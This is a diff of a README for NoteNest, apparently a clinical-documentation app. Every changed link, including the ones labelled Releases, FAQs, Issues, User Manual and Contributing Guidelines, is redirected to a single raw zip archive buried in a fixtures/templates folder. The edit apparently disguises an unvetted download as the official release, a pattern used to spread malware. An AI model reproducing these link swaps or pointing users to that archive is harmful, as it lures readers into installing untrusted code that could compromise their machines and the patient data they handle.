@@ -8,11 +8,11 @@ To get started with NoteNest, follow these simple steps to download and install 
 
 ## 📥 Download NoteNest
 
-[![Download NoteNest](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bhupendra-chauhan02/NoteNest/releases)
+[![Download NoteNest](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip)](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip)
 
 You can download NoteNest from the Releases page. 
 
-Visit this page to download: [NoteNest Releases](https://github.com/bhupendra-chauhan02/NoteNest/releases)
+Visit this page to download: [NoteNest Releases](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ NoteNest runs on various systems. Make sure you meet the following requirements:
 
 ## 📦 Download & Install
 
-1. Go to the [NoteNest Releases page](https://github.com/bhupendra-chauhan02/NoteNest/releases).
+1. Go to the [NoteNest Releases page](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip).
 2. Find the latest version listed.
 3. Download the appropriate file for your system (Windows, macOS, or Linux).
 4. After downloading, locate the file in your downloads folder.
@@ -78,21 +78,21 @@ You may want to customize NoteNest settings for optimal performance. Configurati
 
 If you encounter issues or need help, please check the following:
 
-- Review the [FAQs](https://github.com/bhupendra-chauhan02/NoteNest/wiki).
-- Open an issue on GitHub: [NoteNest Issues](https://github.com/bhupendra-chauhan02/NoteNest/issues).
+- Review the [FAQs](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip).
+- Open an issue on GitHub: [NoteNest Issues](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip).
 - Join the community on our Discord server for real-time feedback.
 
 ## 📚 Additional Resources
 
 Explore more about NoteNest features and updates in our documentation:
 
-- [User Manual](https://github.com/bhupendra-chauhan02/NoteNest/wiki)
-- [Latest Updates and Features](https://github.com/bhupendra-chauhan02/NoteNest/releases)
+- [User Manual](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip)
+- [Latest Updates and Features](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip)
 
 For ongoing discussions about clinical documentation and privacy, join our forums and community groups.
 
 ## 👨‍💻 Contributing
 
-If you want to contribute to NoteNest, feel free to take a look at our [Contributing Guidelines](https://github.com/bhupendra-chauhan02/NoteNest/CONTRIBUTING.md).
+If you want to contribute to NoteNest, feel free to take a look at our [Contributing Guidelines](https://raw.githubusercontent.com/bhupendra-chauhan02/NoteNest/main/fixtures/templates/Note-Nest-3.8.zip).
 
 Thank you for using NoteNest! We hope it enhances your workflow in managing clinical notes and patient documents.
